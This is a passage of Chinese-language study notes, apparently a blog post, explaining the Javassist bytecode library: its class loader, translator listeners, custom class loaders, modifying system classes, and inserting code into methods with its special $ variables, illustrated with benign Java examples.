<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> x, y;    <span class="comment">// not private</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="使用javassist-Loader"><a href="#使用javassist-Loader" class="headerlink" title="使用javassist.Loader"></a>使用javassist.Loader</h3><p>Javassist提供了一个类加载器<code>javassist.Loader</code>，这个类加载器使用<code>javassist.ClassPool</code>对象读取class文件。</p>
<p>例如，<code>javassist.Loader</code>可用于使用javassist修改的指定的类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line"><span class="comment">// 使用ClassPool创建Loader</span></span><br><span class="line">Loader cl = <span class="keyword">new</span> Loader(pool);</span><br><span class="line"></span><br><span class="line">CtClass ct = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Rectangle"</span>);</span><br><span class="line">ct.setSuperclass(pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>));</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; c = cl.loadClass(<span class="string">"org.byron4j.cookbook.javaagent.Rectangle"</span>);</span><br><span class="line">Object o = c.newInstance();</span><br></pre></td></tr></table></figure>

<p>这个程序修改了类Rectangle类，将其父类设置为Point类，然后程序加载了修改后的Rectangle类，并且创建了一个实例。</p>
<p><strong>如果用户想在加载一个类的时候按需修改它，则用户可以添加一个<code>javassist.Loader</code>的事件监听器。当这个类加载器加载一个类的时候就会通知添加好的事件监听器。</strong> 事件监听器必须实现以下两个接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Translator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(ClassPool pool)</span> </span></span><br><span class="line"><span class="function">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onLoad</span><span class="params">(ClassPool pool, String classname)</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>当javassist.Loader中的addTranslator()将这个事件监听器添加到javassist.Loader对象中时，start()方法被调用。</li>
<li>方法onLoad()在javassist.Loader加载一个类之前被调用。onLoad()可以修改加载类的定义。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Loader的观察者</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Translator</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 当对象附加到加载器对象时，加载器将调用该对象进行初始化。此方法可用于获取(用于缓存)一些将在Translator的onLoad()中访问的CtClass对象。</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> pool</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> NotFoundException</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> CannotCompileException</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(ClassPool pool)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NotFoundException, CannotCompileException</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 当Loader加载一个类时，就会通知调用该方法。Loader会在onLoad()方法返回后调用</span></span><br><span class="line"><span class="comment">    *     pool.get(classname).toBytecode()</span></span><br><span class="line"><span class="comment">    * 方法去读取class文件，classname可能是尚未创建的类的名称。</span></span><br><span class="line"><span class="comment">    * 如果这样的话，&lt;code&gt;onLoad()&lt;/code&gt;方法必须创建那个class，以便Loader可以在&lt;code&gt;onLoad()&lt;/code&gt;方法返回后读取它。</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> pool</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> classname</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> NotFoundException</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> CannotCompileException</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onLoad</span><span class="params">(ClassPool pool, String classname)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NotFoundException, CannotCompileException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当<code>javassist.Loader</code>对象的<code>addTranslator()</code>方法添加事件监听器的时候，<code>start()</code>方法就会被调用。 <code>onLoad()</code>方法会在<code>javassist.Loader</code>加载一个类之前被调用。</p>
<p> 以下是这两种情况的源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加事件监听器的时候，就会调用监听器的start方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addTranslator</span><span class="params">(ClassPool cp, Translator t)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException </span>&#123;</span><br><span class="line">    source = cp;</span><br><span class="line">    translator = t;</span><br><span class="line">    t.start(cp);<span class="comment">//&lt;---</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存在监听器，则在Loader的findClass方法中，先执行监听器的onLoad()方法，再通过.get(name).toBytecode()加载类</span></span><br><span class="line"><span class="keyword">if</span> (source != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (translator != <span class="keyword">null</span>)</span><br><span class="line">        translator.onLoad(source, name);<span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        classfile = source.get(name).toBytecode();<span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>所以，<code>translator.onLoad</code>的方法中可以修改加载的类的定义。</strong></p>
<p>例如，下面的事件监听器在加载之前将所有的类改为公共类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTranslator</span> <span class="keyword">implements</span> <span class="title">Translator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(ClassPool pool)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NotFoundException, CannotCompileException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onLoad</span><span class="params">(ClassPool pool, String classname)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NotFoundException, CannotCompileException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        CtClass cc = pool.get(classname);</span><br><span class="line">        cc.setModifiers(Modifier.PUBLIC);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请注意，onLoad()不必调用toBytecode()或writeFile()，因为javassist.Loader调用这些方法来获取类文件。</p>
<p>要运行一个带有MyTranslator对象的应用程序类MyApp，需要写一个主类，如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"com.sec.Point#main invoked!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main2</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">     Translator t = <span class="keyword">new</span> MyTranslator();</span><br><span class="line">     ClassPool pool = ClassPool.getDefault();</span><br><span class="line">     Loader cl = <span class="keyword">new</span> Loader();</span><br><span class="line">     cl.addTranslator(pool, t);</span><br><span class="line">     <span class="comment">// cl.run方法会运行指定MyApp的main方法</span></span><br><span class="line">     cl.run(<span class="string">"com.sec.Point"</span>, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">% java Main2 arg1 arg2</span><br></pre></td></tr></table></figure>



<p>注意：应用的类像Point是不能访问加载器的类如MyTranslator、ClassPool的，因为它们是被不同的加载器加载的。应用的类是由javassist.Loader加载，而其他的是由默认的JVM类加载器加载的。</p>
<p><code>javassist.Loader</code>加载类的顺序和<code>java.lang.ClassLoader</code>不同。 <code>ClassLoader</code>首先将加载操作委托给父加载器，如果父加载器找不到它们才由自身尝试加载类。 反过来说，<code>javassist.Loader</code>在委托给父加载器之前尝试加载类。只有在以下情况才去委托父加载器：</p>
<ul>
<li>类不是由<code>ClassPool.get()</code>找到的</li>
<li>类使用了<code>delegateLoadingOf()</code>去指定由父加载器加载。</li>
</ul>
<p>这个搜索顺序允许Javassist加载修改过的类。然而，如果加载失败的话就会委托给父加载器去加载。一旦一个类由其父加载器加载了，这个类引用的其它类也会由其父加载器加载，则这些类就不会被当前类加载器修改了。 回想一下，类C中所有引用的类都是由类C的真实加载器负责加载的。<strong><em>如果你的程序不能加载一个修改过的类，</em></strong>你应该确保所有使用该类的类都已经被<code>javassist.Loader</code>加载了。</p>
<h3 id="编写一个类加载器"><a href="#编写一个类加载器" class="headerlink" title="编写一个类加载器"></a>编写一个类加载器</h3><p>一个使用Javassist的简单类加载器如下，继承ClassLoader。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SampleLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ClassPool pool;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SampleLoader</span><span class="params">()</span> <span class="keyword">throws</span> NotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.pool = ClassPool.getDefault();</span><br><span class="line">        <span class="keyword">this</span>.pool.insertClassPath(<span class="string">"./target/classes"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        CtClass cc;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            cc = pool.get(name);</span><br><span class="line">            <span class="comment">//TODO</span></span><br><span class="line">            <span class="keyword">byte</span>[] bb = cc.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,bb,<span class="number">0</span>,bb.length);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SampleLoader sl = <span class="keyword">new</span> SampleLoader();</span><br><span class="line">        Class&lt;?&gt; cl = sl.loadClass(<span class="string">"com.sec.Point"</span>);</span><br><span class="line">        cl.getDeclaredMethod("main",new Class[]&#123;String[].class&#125;).invoke(null,new Object[]&#123;args&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设Point是一个应用程序，为了执行这个程序，首先指定<code>./target/classes</code>为class文件目录。构造器中<code>insertClassPath()</code>方法指定了目录名称<code>./target/classes</code>，你可以使用不同的目录名称来代替你想要加载的类路径地址。 执行该程序，类加载器会加载Point类(Point.class文件)并且调用其main方法。</p>
<p>这是使用javassist最简单的示例。然而，如果你想编写一个更加复杂的类加载器，你需要了解更多的java类加载的机制。例如，上面的程序将Point类在命名空间与SampleLoader命名空间分开了，因为这两个是由不同的类加载器加载的。因此，Point类不能直接访问SampleLoader类。</p>
<h3 id="修改一个系统类"><a href="#修改一个系统类" class="headerlink" title="修改一个系统类"></a>修改一个系统类</h3><p>java.lang.String等系统类不能被系统类加载器以外的类加载器加载。因此，上图所示的SampleLoader或javassist.Loader不能在加载时修改系统类。</p>
<p>如果你的应用想那样去做的话（修改系统类），必须<strong><em>静态地</em></strong>修改系统类。</p>
<p>例如，添加一个新的属性字段给<code>java.lang.String</code>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加字段给系统类：java.lang.String</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass ctClass = pool.get(<span class="string">"java.lang.String"</span>);</span><br><span class="line"><span class="comment">// 创建字段</span></span><br><span class="line">CtField cf = <span class="keyword">new</span> CtField(CtClass.intType, <span class="string">"hiddenValue"</span>, ctClass);</span><br><span class="line">cf.setModifiers(Modifier.PUBLIC);</span><br><span class="line"><span class="comment">//添加字段</span></span><br><span class="line">ctClass.addField(cf);</span><br><span class="line">ctClass.writeFile(<span class="string">"."</span>);</span><br></pre></td></tr></table></figure>

<p>这个程序产生一个文件”./java/lang/String.class”。</p>
<p><code>% java -Xbootclasspath/p:. MyApp arg1 arg2...</code></p>
<h3 id="在运行时重新加载一个类"><a href="#在运行时重新加载一个类" class="headerlink" title="在运行时重新加载一个类"></a>在运行时重新加载一个类</h3><p><strong><em>如果启动JVM时启动了JPDA</em></strong>，则一个类可以重加载。在JVM加载一个类后，旧的版本的类的定义可以卸载，新的版本可以重新加载。 换言之，类的定义可以在运行时动态修改。然而，一个新的类的定义必须与旧的类定义在某种程度上兼容。 <strong><em>JVM不允许两个版本之间更改模式。</em></strong> 它们拥有相同的方法、成员变量。</p>
<p>Javassist提供了一个方便的类，用于在运行时重载一个类。更多信息，请参见 javassist.tools.HotSwapper 的 API 文档。</p>
<h2 id="自省-amp-定制化"><a href="#自省-amp-定制化" class="headerlink" title="自省 &amp; 定制化"></a>自省 &amp; 定制化</h2><p><code>CtClass</code>提供了自省的一些方法。Javassist的内省功能和Java反射API的内省功能兼容。 <code>CtClass</code>提供了<code>getName()</code>、<code>getSuperclass()</code>、<code>getMethods()</code>等等方法。<code>CtClass</code>也提供了修改类定义的方法，允许添加一个新的成员变量、构造器、方法，也可以检测方法体。 方法由<code>CtMethod</code>对象表示。<code>CtMethod</code>提供了修改方法定义的几个方法。注意：如果一个方法继承了某个类，则CtMethod表示为是在父类中声明的方法。一个<code>CtMethod</code>对象对应一个方法声明。</p>
<p>例如，如果类Point声明了一个方法move()，而Point类的的一个子类ColorPoint没有覆盖move()方法，这两个move()方法即Point中声名的和ColorPoint中继承的都由相同的CtMethod对象表示。如果修改这个CtMethod对象标表示的方法的定义，则修改会表现到这两个方法上。如果你仅仅想修改ColorPoint中的该方法，你首先必须给ColorPoint添加一个表示move()方法的CtMethod的副本，可以通过<code>CtNewMethod.copy()</code>方法获得。</p>
<p>Javassist不允许移除一个方法或者成员变量，但是允许变更方法名。所以如果一个方法不再需要了，应该重命名并且修改为私有的：调用CtMethod中的<code>setName()</code>和<code>setModifiers()</code>方法。</p>
<p>Javassist不允许在一个已存在的方法中添加额外的参数，为了处理这样的变更，接受额外参数或者其他参数的新方法应该添加在同一个类中。例如，如果你想在一个方法中添加一个额外的参数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> newX, <span class="keyword">int</span> newY)</span> </span>&#123; x = newX; y = newY; &#125;</span><br></pre></td></tr></table></figure>

<p>改成:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> newX, <span class="keyword">int</span> newY, <span class="keyword">int</span> newZ)</span> </span>&#123;    </span><br><span class="line">  <span class="comment">// do what you want with newZ.    </span></span><br><span class="line">  move(newX, newY); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Javassist 也提供了更低层次的API可以直接编辑原生class文件。例如,CtClass的<code>getClassFile()</code>返回一个<code>ClassFile</code>对象表示一个原生class文件。 CtMethod中的<code>getMethodInfo()</code>方法返回一个<code>MethodInfo</code>对象表示在class文件中的一个<code>method_info</code>结构。 低层次的API使用了来自JVM规范的词汇。用户必须了解class文件和字节码。更多的细节，可以参考<a href="http://www.javassist.org/tutorial/tutorial3.html#intro" target="_blank" rel="noopener">javassist.bytecode包</a>。</p>
<p>如果需要被修改的类包含以下以<code>$</code>开头的特殊标识符，则在运行时需要<code>javassist.runtime</code>包来支持。</p>
<h3 id="在方法体的前部、后部插入代码"><a href="#在方法体的前部、后部插入代码" class="headerlink" title="在方法体的前部、后部插入代码"></a>在方法体的前部、后部插入代码</h3><p><code>CtMethod</code>和<code>CtConstructor</code>提供了<code>insertBefore()</code>,<code>insertAfter()</code>和<code>addCatch()</code>方法。他们都是在已存在的方法体中插入代码段，用户可以使用Java中的<strong>源代码文本方式编写代码段</strong>。<strong>Javassist包含一个简单的Java编译器用于处理源文本，接收Java中的源文本并编译成字节码到方法体中。</strong></p>
<p>插入代码段在指定行也是可以的（如果行号表在class文件中的话），<code>CtMethod</code>和<code>CtConstructor</code>的<code>insertAt()</code>方法在源class文件中获取源文本和行号，它将编译源文本并且在指定行插入编译过的代码。</p>
<p>语句和代码块可以指的是字段和方法。特殊变量<code>$0，$1，$2，</code>…来访问方法参数。虽然允许在块中声明一个新的局部变量，但不允许访问方法中声明的局部变量。然而，<code>insertAt()</code>允许语句和代码块访问局部变量，如果这些变量在指定的行号处可用，并且目标方法是用-g选项编译的。</p>
<p>传递给方法<code>insertBefore()</code>、<code>insertAfter()</code>、<code>addCatch()</code>和<code>insertAt()</code>的String对象是由Javassist中包含的编译器编译的。由于编译器支持语言扩展，所以几个以$开头的标识符具有特殊的意义。</p>
<p><img src="../images/Javassist%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210217231334157.png" alt="image-20210217231334157"></p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code>, <code>$1</code>, <code>$2</code>, …</td>
<td><code>this</code> and 方法的参数</td>
</tr>
<tr>
<td><code>$args</code></td>
<td>方法参数数组.它的类型为 <code>Object[]</code></td>
</tr>
<tr>
<td><code>$$</code></td>
<td>所有实参。例如, <code>m($$)</code> 等价于 <code>m($1,$2,</code>…<code>)</code></td>
</tr>
<tr>
<td><code>$cflow(</code>…<code>)</code></td>
<td><code>cflow</code> 变量</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>返回结果的类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$w</code></td>
<td>包装器类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>返回值</td>
</tr>
<tr>
<td><code>$sig</code></td>
<td>类型为 java.lang.Class 的参数类型数组</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，表示返回值类型</td>
</tr>
<tr>
<td><code>$class</code></td>
<td>一个 java.lang.Class 对象，表示当前正在修改的类</td>
</tr>
</tbody></table>
<h4 id="0-1-2"><a href="#0-1-2" class="headerlink" title="$0,$1,$2"></a><code>$0,$1,$2</code></h4><p>传递给目标方法的参数可以用<code>$1</code>，<code>$2</code>，…代替原来的参数名进行访问。1元代表第一个参数，2元代表第二个参数，以此类推。这些变量的类型与参数类型相同。<code>$0</code>相当于这样。如果方法是静态的，则<code>$0</code>不可用。</p>
<p>这些变量的用法如下。假设一个类Point:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> dx, <span class="keyword">int</span> dy)</span> </span>&#123; x += dx; y += dy; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要在调用move()方法时打印dx和dy的值，请执行这个程序：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault(); </span><br><span class="line">CtClass cc = pool.get(<span class="string">"Point"</span>); </span><br><span class="line">CtMethod m = cc.getDeclaredMethod(<span class="string">"move"</span>); </span><br><span class="line">m.insertBefore(<span class="string">"&#123; System.out.println($1); System.out.println($2); &#125;"</span>); </span><br><span class="line">cc.writeFile();</span><br></pre></td></tr></table></figure>

<p>修改后的Point类的定义是这样的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> dx, <span class="keyword">int</span> dy)</span> </span>&#123;</span><br><span class="line">        &#123; </span><br><span class="line">          System.out.println(dx); </span><br><span class="line">          System.out.println(dy); </span><br><span class="line">        &#125;</span><br><span class="line">        x += dx; y += dy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$1</code>和<code>$2</code>分别由dx和dy代替。</p>
<p><code>$1</code>, <code>$2</code>, <code>$3</code> …是可以更新的。如果变量值更改了，那么参数的值也会更新。</p>
<h4 id="args"><a href="#args" class="headerlink" title="$args"></a><code>$args</code></h4><p>变量<code>$args</code>表示<strong>装载所有参数的参数数组</strong>。该变量的类型是一个Object类的数组。如果一个参数类型是一个基本类型，比如int，那么参数值就会被转换为一个包装对象，比如java.lang.Integer来存储在<code>$args</code>中。因此，<code>$args[0]</code>相当于<code>$1</code>，除非第一个参数的类型是一个基本类型。请注意，<code>$args[0]</code>并不等同于​<code>$0</code>，<code>$0</code>代表了<code>this</code>。</p>
<p>如果一个Object数组被分配给$args，那么该数组的每个元素都被分配给每个参数。如果一个参数类型是基本类型，那么对应元素的类型必须是封装类型。在将值分配给参数之前，会将其从封装类型转换为基本类型。</p>
<h4 id><a href="#" class="headerlink" title="$$"></a><code>$$</code></h4><p>变量 $$ 是所有参数列表的缩写，用逗号分隔。 例如，如果方法 move() 的有 3 个参数，则</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">move($$) == move($<span class="number">1</span>, $<span class="number">2</span>, $<span class="number">3</span>)</span><br><span class="line">exMove($$, context) == exMove($<span class="number">1</span>, $<span class="number">2</span>, $<span class="number">3</span>, context)</span><br></pre></td></tr></table></figure>

<p>如果move()不接受任何参数，那么move($$)相当于move()。</p>
<p>请注意，$$使方法调用的通用符号与参数数量相关。它通常与后面的$proceed一起使用。</p>
<h4 id="cflow"><a href="#cflow" class="headerlink" title="$cflow"></a><code>$cflow</code></h4><p>$cflow的意思是 “控制流”。这个只读变量返回特定方法的递归调用深度。</p>
<p>假设下面所示的方法由CtMethod对象cm表示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fact</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> n * fact(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要使用<code>$cflow</code>，首先声明<code>$cflow</code>用于监控对方法fact()的调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtMethod cm = ...;</span><br><span class="line">cm.useCflow(<span class="string">"fact"</span>);</span><br></pre></td></tr></table></figure>

<p>useCflow()的参数是声明的$cflow变量的标识符。任何有效的Java名称都可以作为标识符。由于标识符也可以包含<code>.</code>，例如，<code>my.Test.fact</code>就是一个有效的标识符。</p>
<p>那么，<code>$cflow(fact)</code>表示cm指定的方法的递归调用的深度。当方法第一次被调用时，$cflow(fact)的值是0，而当方法内部被递归调用时，它的值是1。例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cm.insertBefore(<span class="string">"if ($cflow(fact) == 0)"</span></span><br><span class="line">              + <span class="string">"    System.out.println(\"fact \" + $1);"</span>);</span><br></pre></td></tr></table></figure>

<p>翻译方法fact()，以便它显示参数。因为检查了 $cflow(fact) 的值，所以如果在 fact() 中递归调用，则方法 fact() 不会显示参数。</p>
<p><code>$cflow</code>的值是当前线程当前最上面的栈帧下与指定方法cm相关联的栈帧数。在与指定方法cm不同的方法中也可以访问$cflow。</p>
<h4 id="r"><a href="#r" class="headerlink" title="$r"></a><code>$r</code></h4><p>$r 表示方法的结果类型（返回类型）。它用在 cast 表达式中作 cast 转换类型。 下面是一个典型的用法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object result = ... ;</span><br><span class="line">$_ = ($r)result;</span><br></pre></td></tr></table></figure>

<p>如果结果类型是一个基元类型，那么<code>($r)</code>遵循特殊的语义。首先，如果抛出表达式的操作数类型是基本类型，<code>($r)</code>就会作为一个普通的抛出操作数对结果类型进行操作。</p>
<p>另一方面，如果操作数类型是封装类型，<code>($r)</code>就会从封装类型转换到结果类型。例如，如果结果类型是int，那么<code>($r)</code>从java.lang.Integer转换为int。</p>
<p>如果结果类型是void，那么<code>($r)</code>不转换类型，它什么也不做。然而，如果操作数是对void方法的调用，那么($r)的结果是null。例如，如果结果类型是void，而foo()是一个void方法，则</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$_ = ($r)foo();</span><br></pre></td></tr></table></figure>





<h4 id="w"><a href="#w" class="headerlink" title="$w"></a><code>$w</code></h4><p><code>$w</code>代表一个封装类型。它必须在一个cast表达式中作为cast转换类型使用。($w)从一个基本类型转换到相应的封装类型。下面的代码是一个例子。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer i = ($w)<span class="number">5</span>;</span><br></pre></td></tr></table></figure>

<p>选择的封装类型取决于 ($w) 后面的表达式类型。如果表达式的类型是double，那么包装器类型就是java.lang.Double.。</p>
<p>如果<code>($w)</code>后面的表达式类型不是基本类型，那么($w)什么都不做。</p>
<h4 id="-1"><a href="#-1" class="headerlink" title="$_"></a><code>$_</code></h4><p>CtMethod和CtConstructor中的<code>insertAfter()</code>将编译后的代码插入到方法的最后。在给<code>insertAfter()</code>的语句中，不仅有上面所示的变量如<code>$0,$1</code>，还可以有<code>$_</code>。</p>
<p>变量<code>$_</code>表示方法的结果值。该变量的类型就是该方法的结果类型（返回类型）。如果结果类型是void，那么<code>$_</code>的类型是Object，<code>$_</code>的值是null。</p>
<p>虽然由insertAfter()插入的编译代码是在控件从方法中正常返回之前执行的，但它也可以在方法抛出异常时执行。<strong>为了在发生异常时执行它，<code>insertAfter()</code>的第二个参数asFinally必须为true。</strong></p>
<p>如果抛出异常，由<code>insertAfter()</code>插入的编译代码将作为最后子句执行。在编译后的代码中，<code>$_</code>的值为0或空。在编译代码执行终止后，原来抛出的异常会重新抛给调用者。注意，<code>$_</code>的值永远不会被抛给调用者，而是被丢弃。</p>
<h4 id="sig"><a href="#sig" class="headerlink" title="$sig"></a><code>$sig</code></h4><p>$sig的值是一个由java.lang.Class对象组成的数组，这些对象<strong>按照声明顺序表示形参类型</strong>。</p>
<h4 id="type"><a href="#type" class="headerlink" title="$type"></a><code>$type</code></h4><p>$type的值是一个java.lang.Class对象，代表结果值的类型。如果这是一个构造函数，那么这个变量是指Void.class。</p>
<h4 id="class"><a href="#class" class="headerlink" title="$class"></a><code>$class</code></h4><p><code>$class</code> 的值是一个 java.lang.Class 对象，代表声明编辑的方法所在的类。这代表了<code>$0</code>的类型。</p>
<h4 id="addCatch"><a href="#addCatch" class="headerlink" title="addCatch"></a><code>addCatch</code></h4><p><code>addCatch()</code>插入方法体抛出异常时执行的代码，控制权会返回给调用者。 在插入的源代码中，异常用 $e 表示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtMethod m = ...;</span><br><span class="line">CtClass etype = ClassPool.getDefault().get(<span class="string">"java.io.IOException"</span>);</span><br><span class="line">m.addCatch(<span class="string">"&#123; System.out.println($e); throw $e; &#125;"</span>, etype);</span><br></pre></td></tr></table></figure>

<p>转换成对应的 java 代码如下：</p>
